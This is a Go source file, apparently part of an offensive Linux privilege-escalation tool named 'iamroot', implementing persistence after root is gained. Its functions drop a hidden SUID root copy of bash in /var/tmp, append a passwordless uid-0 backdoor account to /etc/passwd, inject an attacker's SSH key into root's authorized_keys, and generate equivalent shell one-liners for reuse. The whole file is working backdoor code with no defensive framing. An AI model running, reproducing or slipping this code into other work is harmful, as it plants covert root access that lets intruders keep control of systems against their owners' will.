package persist

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/cleissonamanacio/iamroot/internal/sysutil"
)

const suidShell = "/var/tmp/.iamroot_rootbash"

func DropSuidBash() bool {
	if os.Geteuid() != 0 {
		return false
	}
	if err := exec.Command("cp", "/bin/bash", suidShell).Run(); err != nil {
		return false
	}
	if err := os.Chmod(suidShell, 0o4755); err != nil {
		return false
	}
	fmt.Printf("[+] SUID root bash dropped at %s\n", suidShell)
	return true
}

func AddBackdoorUser(user string) bool {
	if os.Geteuid() != 0 {
		return false
	}
	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		return false
	}
	if strings.Contains(string(data), user+":") {
		return true
	}
	f, err := os.OpenFile("/etc/passwd", os.O_WRONLY|os.O_APPEND, 0)
	if err != nil {
		return false
	}
	defer f.Close()
	_, err = fmt.Fprintf(f, "%s::0:0::/root:/bin/bash\n", user)
	if err == nil {
		fmt.Printf("[+] Backdoor user '%s' (uid=0, no password) written to /etc/passwd\n", user)
	}
	return err == nil
}

func InjectSSHKey() bool {
	pub := strings.TrimSpace(os.Getenv("IAMROOT_PUBKEY"))
	if pub == "" {
		return false
	}
	if err := exec.Command("mkdir", "-p", "/root/.ssh").Run(); err != nil {
		return false
	}
	_ = os.Chmod("/root/.ssh", 0o700)
	f, err := os.OpenFile("/root/.ssh/authorized_keys", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0o600)
	if err != nil {
		return false
	}
	defer f.Close()
	fmt.Fprintln(f, pub)
	fmt.Println("[+] SSH key injected into /root/.ssh/authorized_keys")
	return true
}

func Establish(persistUser string) {

	if os.Getuid() != 0 && os.Geteuid() == 0 {
		sysutil.SetFullRoot()
	}
	DropSuidBash()
	InjectSSHKey()
	if persistUser != "" {
		AddBackdoorUser(persistUser)
	}
}

func Block(persistUser string) string {
	var b strings.Builder
	b.WriteString(fmt.Sprintf("cp /bin/bash %s 2>/dev/null && chmod 4755 %s 2>/dev/null\n", suidShell, suidShell))
	if pub := strings.TrimSpace(os.Getenv("IAMROOT_PUBKEY")); pub != "" {
		b.WriteString("mkdir -p /root/.ssh && chmod 700 /root/.ssh\n")
		b.WriteString(fmt.Sprintf("grep -qF '%s' /root/.ssh/authorized_keys 2>/dev/null || echo '%s' >> /root/.ssh/authorized_keys\n", pub, pub))
	}
	if persistUser != "" {
		b.WriteString(fmt.Sprintf("grep -q '^%s:' /etc/passwd || echo '%s::0:0::/root:/bin/bash' >> /etc/passwd\n", persistUser, persistUser))
	}
	return b.String()
}
